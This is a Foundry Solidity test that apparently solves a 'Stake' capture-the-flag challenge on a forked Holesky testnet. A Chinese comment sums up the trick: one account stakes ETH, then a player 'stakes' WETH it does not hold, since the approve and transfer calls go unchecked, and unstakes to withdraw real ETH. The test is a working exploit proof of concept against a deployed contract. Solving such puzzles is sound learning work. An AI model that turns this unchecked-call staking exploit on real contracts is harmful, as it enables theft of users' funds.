// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Stake} from "../src/Stake.sol";

// forge test -vvvv --match-test testStake --fork-url https://ethereum-holesky-rpc.publicnode.com --evm-version shanghai

/*
WETH: 0x42A09C3fbfb22774936B5D5d085e2FA7963b0db8

这道题很烂，解题思路是player1 stake一部分eth，然后player通过stake weth再unstake来盗取eth
*/

contract StakeTest is Test {
    Stake public stake = Stake(0x2dEC45dC10bfF519e83DEC103c9931b6CCfD6D54);
    address public weth = 0x42A09C3fbfb22774936B5D5d085e2FA7963b0db8;
    uint256 public stakeAmount = 0.0011 ether;

    function testStake() public {
        realStake();

        address player = makeAddr("player");

        vm.startPrank(player, player);

        weth.call(abi.encodeWithSignature("approve(address,uint256)", address(stake), uint256(stakeAmount)));

        stake.StakeWETH(stakeAmount);
        stake.Unstake(stakeAmount);

        console.log("total stake %d", stake.totalStaked());
        console.log("eth balance %d", address(stake).balance);
        console.log("staker %d", stake.Stakers(player));
        console.log("player stake balance %d", stake.UserStake(player));

        assert(address(stake).balance > 0);
        assert(stake.totalStaked() > address(stake).balance);
        assert(stake.Stakers(player) == true);
        assert(stake.UserStake(player) == 0);

        vm.stopPrank();
    }

    function realStake() public {
        address player1 = makeAddr("player1");
        vm.deal(player1, 1 ether);

        vm.startPrank(player1, player1);

        address(stake).call{value: stakeAmount + 1 wei}(abi.encodeWithSignature("StakeETH()"));

        vm.stopPrank();
    }
}